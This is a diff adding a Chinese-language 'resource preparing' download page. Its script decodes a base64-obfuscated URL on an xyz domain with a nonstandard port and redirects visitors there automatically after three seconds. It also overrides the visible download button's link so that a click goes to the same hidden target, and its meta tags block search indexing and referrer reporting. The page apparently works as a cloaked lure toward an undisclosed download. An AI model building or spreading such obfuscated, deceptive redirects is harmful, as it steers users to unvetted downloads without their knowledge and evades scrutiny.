@@ -1,0 +1,40 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<link rel="canonical" href="https://calbxyf.com/">
+<title>资源准备中</title>
+<style>
+*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Microsoft YaHei",sans-serif;color:#eef7ff;background:radial-gradient(circle at 20% 20%,rgba(58,232,255,.26),transparent 32%),radial-gradient(circle at 78% 12%,rgba(255,125,82,.24),transparent 30%),linear-gradient(135deg,#071227,#151143 58%,#27145a)}.handoff{width:min(92vw,520px);padding:38px;border:1px solid rgba(160,210,255,.28);border-radius:28px;background:rgba(8,18,42,.74);box-shadow:0 28px 80px rgba(0,0,0,.38),0 0 36px rgba(95,118,255,.22);backdrop-filter:blur(18px);text-align:center}.pulse{width:72px;height:72px;margin:0 auto 20px;border-radius:50%;background:linear-gradient(135deg,#26e6d4,#7f78ff 55%,#ff8658);box-shadow:0 0 34px rgba(38,230,212,.42);position:relative}.pulse:after{content:"";position:absolute;inset:14px;border-radius:50%;border:2px solid rgba(255,255,255,.75)}h1{margin:0 0 12px;font-size:30px}.handoff p{margin:8px 0;color:#c8d7ff;line-height:1.8}.bar{height:10px;border-radius:99px;background:rgba(255,255,255,.12);overflow:hidden;margin:26px 0}.bar span{display:block;width:0;height:100%;border-radius:inherit;background:linear-gradient(90deg,#27e8d5,#8d7dff,#ff8b54);animation:load 3s linear forwards}.manual{display:inline-flex;align-items:center;justify-content:center;margin-top:8px;padding:13px 28px;border-radius:999px;color:#081225;text-decoration:none;font-weight:800;background:linear-gradient(135deg,#ffe06a,#ff8b54 52%,#ff4fb8);box-shadow:0 0 26px rgba(255,139,84,.4);transition:transform .2s ease,box-shadow .2s ease}.manual:hover{transform:translateY(-2px);box-shadow:0 0 34px rgba(255,139,84,.58)}@keyframes load{to{width:100%}}
+</style>
+</head>
+<body>
+  <main class="handoff">
+    <div class="pulse" aria-hidden="true"></div>
+    <h1>资源准备中</h1>
+    <p>正在校验连接环境</p>
+    <p>即将进入下载页面</p>
+    <p>请勿关闭当前页面</p>
+    <div class="bar" aria-hidden="true"><span></span></div>
+    <a id="manualDownload" class="manual" href="/kexue.html" rel="nofollow noopener noreferrer">立即下载</a>
+  </main>
+  <script>
+  const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9haHpxLjMxMzQ4Ni54eXo6MzU4ODgv");
+  const manualDownload = document.getElementById("manualDownload");
+  window.setTimeout(function () {
+    window.location.replace(REAL_DOWNLOAD_URL);
+  }, 3000);
+  manualDownload.addEventListener("click", function(e){
+    e.preventDefault();
+    window.location.replace(REAL_DOWNLOAD_URL);
+  });
+  </script>
+</body>
+</html>
